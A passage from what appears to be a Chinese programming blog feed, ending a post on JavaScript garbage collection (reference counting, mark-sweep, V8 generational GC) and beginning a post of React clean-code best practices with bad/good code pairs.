<h3 id="垃圾产生-amp-为何回收"><a href="#垃圾产生-amp-为何回收" class="headerlink" title="垃圾产生&amp;为何回收"></a>垃圾产生&amp;为何回收</h3><p>我们知道写代码时创建一个基本类型、对象、函数……都是需要占用内存的，但是我们并不关注这些，因为这是引擎为我们分配的，我们不需要显式手动的去分配内存。</p>
<p>但是，你有没有想过，当我们不再需要某个东西时会发生什么？JavaScript 引擎又是如何发现并清理它的呢？</p>
<p>我们举个简单的例子</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> test = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;isboyjc&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line">test = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br></pre></td></tr></table></figure>

<p>如上所示，我们假设它是一个完整的程序代码。</p>
<p>我们知道 <code>JavaScript</code> 的引用数据类型是保存在堆内存中的，然后在栈内存中保存一个对堆内存中实际对象的引用，所以，<code>JavaScript</code> 中对引用数据类型的操作都是操作对象的引用而不是实际的对象。可以简单理解为，栈内存中保存了一个地址，这个地址和堆内存中的实际值是相关的</p>
<p>那上面代码首先我们声明了一个变量 <code>test</code>，它引用了对象 <code>&#123;name: &#39;isboyjc&#39;&#125;</code>，接着我们把这个变量重新赋值了一个数组对象，也就变成了该变量引用了一个数组，那么之前的对象引用关系就没有了，如下图：</p>
<p><img src="https://cdn.huatree.top/image-20230812235903208.png" alt="image-20230812235903208"></p>
<p>没有了引用关系，也就是无用的对象，这个时候假如任由它搁置，一个两个还好，多了的话内存也会受不了，所以就需要被清理（回收）</p>
<p>用官方一点的话说，程序的运行需要内存，只要程序提出要求，操作系统或者运行时就必须提供内存，那么对于持续运行的服务进程，必须要及时释放内存，否则，内存占用越来越高，轻则影响系统性能，重则就会导致进程崩溃。</p>
<h3 id="怎么回收"><a href="#怎么回收" class="headerlink" title="怎么回收"></a>怎么回收</h3><p>大多数内存管理的问题都在这个阶段。在这里最艰难的任务是找到“哪些被分配的内存确实已经不再需要了”。它往往要求开发人员来确定在程序中哪一块内存不再需要并且释放它。</p>
<p>高级语言解释器嵌入了“垃圾回收器”，它的主要工作是跟踪内存的分配和使用，以便当分配的内存不再使用时，自动释放它。这只能是一个近似的过程，因为要知道是否仍然需要某块内存是无法判定的（无法通过某种算法解决）。</p>
<p>如上文所述自动寻找是否一些内存“不再需要”的问题是无法判定的。因此，垃圾回收实现只能有限制的解决一般问题。</p>
<p>在 JavaScript 内存管理中有一个概念叫做 <code>可达性</code>，就是那些以某种方式可访问或者说可用的值，它们被保证存储在内存中，反之不可访问则需回收</p>
<p>至于如何回收，其实就是怎样发现这些不可达的对象（垃圾）它并给予清理的问题， <code>JavaScript</code> 垃圾回收机制的原理说白了也就是定期找出那些不再用到的内存（变量），然后释放其内存</p>
<p>你可能还会好奇为什么不是实时的找出无用内存并释放呢？其实很简单，实时开销太大了</p>
<p>我们都可以 Get 到这之中的重点，那就是怎样找出所谓的垃圾？</p>
<p>这个流程就涉及到了一些算法策略，有很多种方式，我们简单介绍两个最常见的：</p>
<ul>
<li>引用计数算法</li>
<li>标记清除算法</li>
</ul>
<h2 id="引用计数算法"><a href="#引用计数算法" class="headerlink" title="引用计数算法"></a>引用计数算法</h2><p>引用计数（Reference Counting），这是最初级的垃圾收集算法，它把 <code>对象是否不再需要</code> 简化定义为 <code>对象有没有其他对象引用到它</code>，如果没有引用指向该对象（零引用），对象将被垃圾回收机制回收，目前很少使用这种算法了，因为它的问题很多，不过我们还是需要了解一下。</p>
<p>它的策略是跟踪记录每个变量值被使用的次数。</p>
<ul>
<li>当声明了一个变量并且将一个引用类型赋值给该变量的时候这个值的引用次数就为 1；</li>
<li>如果同一个值又被赋给另一个变量，那么引用数加 1；</li>
<li>如果该变量的值被其他的值覆盖了，则引用次数减 1；</li>
<li>当这个值的引用次数变为 0 的时候，说明没有变量在使用，这个值没法被访问了，回收空间，垃圾回收器会在运行的时候清理掉引用次数为 0 的值占用的内存；</li>
</ul>
<p>我们来看看下面这个列子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">Object</span>()  <span class="comment">// 此对象的引用计数为 1（a引用）</span></span><br><span class="line"><span class="keyword">let</span> b = a       <span class="comment">// 此对象的引用计数是 2（a,b引用）</span></span><br><span class="line">a = <span class="literal">null</span>        <span class="comment">// 此对象的引用计数为 1（b引用）</span></span><br><span class="line">b = <span class="literal">null</span>         <span class="comment">// 此对象的引用计数为 0（无引用）</span></span><br><span class="line">...          <span class="comment">// GC 回收此对象</span></span><br></pre></td></tr></table></figure>

<p>这种方式是不是很简单？确实很简单，不过在引用计数这种算法出现没多久，就遇到了一个很严重的问题——循环引用，即对象 A 有一个指针指向对象 B，而对象 B 也引用了对象 A ，如下面这个例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> A = <span class="keyword">new</span> <span class="title class_">Object</span>()</span><br><span class="line">  <span class="keyword">let</span> B = <span class="keyword">new</span> <span class="title class_">Object</span>()</span><br><span class="line">  </span><br><span class="line">  A.<span class="property">b</span> = B</span><br><span class="line">  B.<span class="property">a</span> = A</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上所示，对象 A 和 B 通过各自的属性相互引用着，按照上文的引用计数策略，它们的引用数量都是 2，但是，在函数 <code>test</code> 执行完成之后，对象 A 和 B 是要被清理的，但使用引用计数则不会被清理，因为它们的引用数量不会变成 0，假如此函数在程序中被多次调用，那么就会造成大量的内存不会被释放。</p>
<p>我们再用标记清除的角度看一下，当函数结束后，两个对象都不在作用域中，A 和 B 都会被当作非活动对象来清除掉，相比之下，引用计数则不会释放，也就会造成大量无用内存占用，这也是后来放弃引用计数，使用标记清除的原因之一。</p>
<p> JavaScript高级程序设计第四版 4.3.2 小节有提到的。在 IE8 以及更早版本的 IE 中，<code>BOM</code> 和 <code>DOM</code> 对象并非是原生 <code>JavaScript</code> 对象，它是由 <code>C++</code> 实现的 <code>组件对象模型对象（COM，Component Object Model）</code>，而 <code>COM</code> 对象使用 引用计数算法来实现垃圾回收，所以即使浏览器使用的是标记清除算法，只要涉及到 <code>COM</code> 对象的循环引用，就还是无法被回收掉，就比如两个互相引用的 <code>DOM</code> 对象等等，而想要解决循环引用，需要将引用地址置为 <code>null</code> 来切断变量与之前引用值的关系，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// COM对象</span></span><br><span class="line"><span class="keyword">let</span> ele = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="keyword">let</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 造成循环引用</span></span><br><span class="line">obj.<span class="property">ele</span> = ele</span><br><span class="line">ele.<span class="property">obj</span> = obj</span><br><span class="line"></span><br><span class="line"><span class="comment">// 切断引用关系</span></span><br><span class="line">obj.<span class="property">ele</span> = <span class="literal">null</span></span><br><span class="line">ele.<span class="property">obj</span> = <span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>不过在 IE9 及以后的 <code>BOM</code> 与 <code>DOM</code> 对象都改成了 <code>JavaScript</code> 对象，也就避免了上面的问题。</p>
<p><strong>优点：</strong></p>
<p>引用计数在引用值为 0 时，也就是在变成垃圾的那一刻就会被回收，所以它可以立即回收垃圾。</p>
<p><strong>缺点：</strong></p>
<p>引用计数的缺点想必大家也都很明朗了，首先它需要一个计数器，而此计数器需要占很大的位置，因为我们也不知道被引用数量的上限，还有就是无法解决循环引用无法回收的问题，这也是最严重的。</p>
<h2 id="标记清除算法"><a href="#标记清除算法" class="headerlink" title="标记清除算法"></a>标记清除算法</h2><p>标记清除（Mark-Sweep），目前在 <code>JavaScript引擎</code> 里这种算法是最常用的，到目前为止的大多数浏览器的 <code>JavaScript引擎</code> 都在采用标记清除算法，只是各大浏览器厂商还对此算法进行了优化加工，且不同浏览器的 <code>JavaScript引擎</code> 在运行垃圾回收的频率上有所差异。</p>
<p>就像它的名字一样，此算法分为 <code>标记</code> 和 <code>清除</code> 两个阶段，标记阶段即为所有活动对象做上标记，清除阶段则把没有标记（也就是非活动对象）销毁。</p>
<p>你可能会疑惑怎么给变量加标记？其实有很多种办法，比如当变量进入执行环境时，反转某一位（通过一个二进制字符来表示标记），又或者可以维护进入环境变量和离开环境变量这样两个列表，可以自由的把变量从一个列表转移到另一个列表，当前还有很多其他办法。其实，怎样标记对我们来说并不重要，重要的是其策略</p>
<p>引擎在执行 GC（使用标记清除算法）时，需要从出发点去遍历内存中所有的对象去打标记，而这个出发点有很多，我们称之为一组 <code>根</code> 对象，而所谓的根对象，其实在浏览器环境中包括又不止于 <code>全局Window对象</code>、<code>文档DOM树</code> 等。</p>
<p>整个标记清除算法大致过程就像下面这样</p>
<ul>
<li>垃圾收集器在运行时会给内存中的所有变量都加上一个标记，假设内存中所有对象都是垃圾，全标记为0；</li>
<li>然后从各个根对象开始遍历，把不是垃圾的节点改成1；</li>
<li>清理所有标记为0的垃圾，销毁并回收它们所占用的内存空间；</li>
<li>最后，把所有内存中对象标记修改为0，等待下一轮垃圾回收；</li>
</ul>
<p><strong>优点：</strong></p>
<p>标记清除算法的优点只有一个，那就是实现比较简单，打标记也无非打与不打两种情况，这使得一位二进制位（0和1）就可以为其标记，非常简单。</p>
<p><strong>缺点：</strong></p>
<p>标记清除算法有一个很大的缺点，就是在清除之后，剩余的对象内存位置是不变的，也会导致空闲内存空间是不连续的，出现了 <code>内存碎片</code>，并且由于剩余空闲内存不是一整块，它是由不同大小内存组成的内存列表，这就牵扯出了内存分配的问题。如下图：</p>
<p><img src="https://cdn.huatree.top/image-20230813010050238.png" alt="image-20230813010050238"></p>
<p>假设我们新建对象分配内存时需要大小为 <code>size</code>，由于空闲内存是间断的、不连续的，则需要对空闲内存列表进行一次单向遍历找出大于等于 <code>size</code> 的块才能为其分配。如下图：</p>
<p><img src="https://cdn.huatree.top/image-20230813010230686.png" alt="image-20230813010230686"></p>
<p>那如何找到合适的块呢？我们可以采取下面三种分配策略</p>
<ul>
<li><code>First-fit</code>，找到大于等于 <code>size</code> 的块立即返回</li>
<li><code>Best-fit</code>，遍历整个空闲列表，返回大于等于 <code>size</code> 的最小分块</li>
<li><code>Worst-fit</code>，遍历整个空闲列表，找到最大的分块，然后切成两部分，一部分 <code>size</code> 大小，并将该部分返回</li>
</ul>
<p>这三种策略里面 <code>Worst-fit</code> 的空间利用率看起来是最合理，但实际上切分之后会造成更多的小块，形成内存碎片，所以不推荐使用，对于 <code>First-fit</code> 和 <code>Best-fit</code> 来说，考虑到分配的速度和效率 <code>First-fit</code> 是更为明智的选择</p>
<p>综上所述，标记清除算法或者说策略就有两个很明显的缺点</p>
<ul>
<li><strong>内存碎片化</strong>，空闲内存块是不连续的，容易出现很多空闲内存块，还可能会出现分配所需内存过大的对象时找不到合适的块</li>
<li><strong>分配速度慢</strong>，因为即便是使用 <code>First-fit</code> 策略，其操作仍是一个 <code>O(n)</code> 的操作，最坏情况是每次都要遍历到最后，同时因为碎片化，大对象的分配效率会更慢</li>
</ul>
<p>归根结底，标记清除算法的缺点在于清除之后剩余的对象位置不变而导致的空闲内存不连续，所以只要解决这一点，两个缺点都可以完美解决了</p>
<p>而 <strong>标记整理（Mark-Compact）算法</strong>就可以有效地解决，它的标记阶段和标记清除算法没有什么不同，只是标记结束后，标记整理算法会将活着的对象（即不需要清理的对象）向内存的一端移动，最后清理掉边界的内存。如下图：</p>
<p><img src="https://cdn.huatree.top/image-20230813011227539.png" alt="image-20230813011227539"></p>
<h2 id="V8对GC的优化"><a href="#V8对GC的优化" class="headerlink" title="V8对GC的优化"></a>V8对GC的优化</h2><p>我们在上面也说过，现在大多数浏览器都是基于标记清除算法，V8 亦是，当然 V8 肯定也对其进行了一些优化加工处理，那接下来我们主要就来看 V8 中对垃圾回收机制的优化。</p>
<h3 id="分代式垃圾回收"><a href="#分代式垃圾回收" class="headerlink" title="分代式垃圾回收"></a>分代式垃圾回收</h3><p>试想一下，我们上面所说的垃圾清理算法在每次垃圾回收时都要检查内存中所有的对象，这样的话对于一些大、老、存活时间长的对象来说同新、小、存活时间短的对象一个频率的检查很不好，因为前者需要时间长并且不需要频繁进行清理，后者恰好相反，怎么优化这点呢？分代式就来了。</p>
<p><code>V8</code> 的垃圾回收策略主要是基于 <code>分代式垃圾回收策略</code>，其根据<strong>对象的存活时间</strong>将内存的垃圾回收进行不同的分代，然后对不同的分代采用不同的垃圾回收算法。</p>
<h4 id="新老生代"><a href="#新老生代" class="headerlink" title="新老生代"></a>新老生代</h4><p>V8 的垃圾回收策略主要基于分代式垃圾回收机制，V8 中将堆内存分为新生代和老生代两区域，采用不同的垃圾回收器也就是不同的策略管理垃圾回收</p>
<p>新生代的对象为存活时间较短的对象，简单来说就是新产生的对象，通常只支持 <code>1～8M</code> 的容量，而老生代的对象为存活时间较长或常驻内存的对象，简单来说就是经历过新生代垃圾回收后还存活下来的对象，容量通常比较大</p>
<p>V8 整个堆内存的大小就等于新生代加上老生代的内存。如下图：</p>
<p><img src="https://cdn.huatree.top/image-20230813012453685.png" alt="image-20230813012453685"></p>
<p>对于新老两块内存区域的垃圾回收，V8 采用了两个垃圾回收器来管控，我们暂且将管理新生代的垃圾回收器叫做新生代垃圾回收器，同样的，我们称管理老生代的垃圾回收器叫做老生代垃圾回收器好了。</p>
<p>了解更多，<a href="https://mp.weixin.qq.com/s/ISId8v-0NZIhfZsfy7cfww">详见</a></p>
<h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="怎么理解内存泄漏？"><a href="#怎么理解内存泄漏？" class="headerlink" title="怎么理解内存泄漏？"></a>怎么理解内存泄漏？</h3><p><a href="https://mp.weixin.qq.com/s/bQhDdjmkyZMxRgip4vaElA">详见</a></p>
<h3 id="怎么解决内存泄漏，代码层面如何优化？"><a href="#怎么解决内存泄漏，代码层面如何优化？" class="headerlink" title="怎么解决内存泄漏，代码层面如何优化？"></a>怎么解决内存泄漏，代码层面如何优化？</h3><ol>
<li><p>减少查找</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> i, str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">packageDomGlobal</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        str += i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种情况。我们采用局部变量来保存保存相关数据</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">packageDomLocal</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        str += i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>减少变量声明</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一种情况，循环体中没有抽离出值不变的数据</span></span><br><span class="line"><span class="keyword">var</span> <span class="title function_">test</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [<span class="string">&#x27;czs&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;I love FrontEnd&#x27;</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(arr[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种情况，循环体中抽离出值不变的数据</span></span><br><span class="line"><span class="keyword">var</span> <span class="title function_">test</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> arr = [<span class="string">&#x27;czs&#x27;</span>, <span class="number">25</span>, <span class="string">&#x27;I love FrontEnd&#x27;</span>];</span><br><span class="line">  <span class="keyword">const</span> length = arr.<span class="property">length</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(arr[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 Performance + Memory 分析内存与性能</p>
</li>
</ol>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Memory_management">内存管理</a></p>
<p>[2] <a href="https://mp.weixin.qq.com/s/ISId8v-0NZIhfZsfy7cfww">「硬核JS」你真的了解垃圾回收机制吗</a></p>
<p>[3] <a href="https://mp.weixin.qq.com/s/5sZfht1fbVVrUTQE84NNTQ">一文让你彻底搞懂JS垃圾回收机制</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>清洁React项目的21个最佳实践</title>
    <url>/2023/08/18/20230818-%E6%B8%85%E6%B4%81React%E9%A1%B9%E7%9B%AE%E7%9A%8421%E4%B8%AA%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<p>React 对于如何构建事物非常没有主见。这正是我们有责任保持项目整洁和可维护的原因。</p>
<p>今天，我们将讨论一些改善 React 应用程序健康状况的最佳实践。这些规则被广泛接受。因此，掌握这些知识是势在必行的。</p>
<p>一切都将通过代码进行演示，所以请系好安全带！</p>
<span id="more"></span>

<h2 id="1-使用JSX简写"><a href="#1-使用JSX简写" class="headerlink" title="1. 使用JSX简写"></a>1. 使用JSX简写</h2><p>尝试使用 JSX 简写来传递布尔变量。假设您想要控制导航栏组件的标题可见性。</p>
<h3 id="bad"><a href="#bad" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Navbar</span> <span class="attr">showTitle</span>=<span class="string">&#123;true&#125;</span> /&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="good"><a href="#good" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>(</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Navbar</span> <span class="attr">showTitle</span> /&gt;</span></span>  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="2-使用三元运算符"><a href="#2-使用三元运算符" class="headerlink" title="2. 使用三元运算符"></a>2. 使用三元运算符</h2><p>假设您想根据角色显示用户的详细信息。</p>
<h3 id="bad-1"><a href="#bad-1" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; role &#125; = user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(role === <span class="variable constant_">ADMIN</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">AdminUser</span> /&gt;</span></span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">NormalUser</span> /&gt;</span></span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h3 id="goods"><a href="#goods" class="headerlink" title="goods"></a>goods</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; role &#125; = user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> role === <span class="variable constant_">ADMIN</span> ? <span class="language-xml"><span class="tag">&lt;<span class="name">AdminUser</span> /&gt;</span></span> : <span class="language-xml"><span class="tag">&lt;<span class="name">NormalUser</span> /&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="3-利用对象字面量"><a href="#3-利用对象字面量" class="headerlink" title="3. 利用对象字面量"></a>3. 利用对象字面量</h2><p>对象字面量可以帮助我们的代码更具可读性。假设您想根据角色显示三种类型的用户。您不能使用三元，因为选项数量超过两个。</p>
<h3 id="bad-2"><a href="#bad-2" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;role&#125; = user</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(role)&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="attr">ADMIN</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">AdminUser</span> /&gt;</span></span></span><br><span class="line">  <span class="keyword">case</span> <span class="attr">EMPLOYEE</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">EmployeeUser</span> /&gt;</span></span></span><br><span class="line">  <span class="keyword">case</span> <span class="attr">USER</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">NormalUser</span> /&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="good-1"><a href="#good-1" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;role&#125; = user</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> components = &#123;</span><br><span class="line">  <span class="attr">ADMIN</span>: <span class="title class_">AdminUser</span>,</span><br><span class="line">  <span class="attr">EMPLOYEE</span>: <span class="title class_">EmployeeUser</span>,</span><br><span class="line">  <span class="attr">USER</span>: <span class="title class_">NormalUser</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Component</span> = components[role];</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Componenent</span> /&gt;</span></span>;</span><br></pre></td></tr></table></figure>

<p>现在看起来好多了。</p>
<h2 id="4-使用片段"><a href="#4-使用片段" class="headerlink" title="4. 使用片段"></a>4. 使用片段</h2><p>尽量使用<code>Fragment</code>而不是<code>div</code>. 它可以保持代码整洁，并且也有利于性能，因为在虚拟 DOM 中创建的节点少了一个。</p>
<h3 id="bad-3"><a href="#bad-3" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component1</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component2</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component3</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="good-2"><a href="#good-2" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component1</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component2</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Component3</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="5-不要在render中定义函数"><a href="#5-不要在render中定义函数" class="headerlink" title="5. 不要在render中定义函数"></a>5. 不要在render中定义函数</h2><p>不要在render中定义函数。尽量使render中的逻辑最小化。</p>
<h3 id="bad-4"><a href="#bad-4" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> dispatch(ACTION_TO_SEND_DATA)&#125;&gt;    // NOTICE HERE</span></span><br><span class="line"><span class="language-xml">      This is a bad example </span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="good-3"><a href="#good-3" class="headerlink" title="good"></a>good</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">submitData</span> = (<span class="params"></span>) =&gt; <span class="title function_">dispatch</span>(<span class="variable constant_">ACTION_TO_SEND_DATA</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;submitData&#125;</span>&gt;</span>  </span></span><br><span class="line"><span class="language-xml">    This is a good example </span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>  </span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="6-使用useMemo"><a href="#6-使用useMemo" class="headerlink" title="6. 使用useMemo"></a>6. 使用useMemo</h2><p><code>React.PureComponent</code> 和 <code>useMemo</code> 可以显著提高应用程序的性能。它们帮助我们避免不必要的渲染。</p>
<h3 id="bad-5"><a href="#bad-5" class="headerlink" title="bad"></a>bad</h3><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">TestMemo</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [userName, setUserName] = <span class="title function_">useState</span>(<span class="string">&quot;faisal&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">increment</span> = (<span class="params"></span>) =&gt; <span class="title function_">setCount</span>(<span class="function">(<span class="params">count</span>) =&gt;</span> count + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ChildrenComponent</span> <span class="attr">userName</span>=<span class="string">&#123;userName&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;increment&#125;</span>&gt;</span> Increment <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ChildrenComponent</span> =(<span class="params">&#123; userName &#125;</span>) =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;rendered&quot;</span>, userName);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;userName&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>尽管 <code>ChildComponent</code> 的值与 <code>count</code> 无关,但它应该只渲染一次。但是,每次点击按钮时它都会重新渲染。</p>
<h3 id="good-4"><a href="#good-4" class="headerlink" title="good"></a>good</h3><p>将 <code>ChildrenComponent</code> 改为：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> ,&#123;useState&#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">ChildrenComponent</span> = <span class="title class_">React</span>.<span class="title function_">memo</span>(<span class="function">(<span class="params">&#123;userName&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;rendered&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span> &#123;userName&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>现在,无论单击按钮多少次,它都只会在必要时重新渲染。</p>
<h2 id="7-使用对象解构"><a href="#7-使用对象解构" class="headerlink" title="7. 使用对象解构"></a>7. 使用对象解构</h2><p>充分利用对象解构。假设你需要显示一个用户的详细信息。</p>
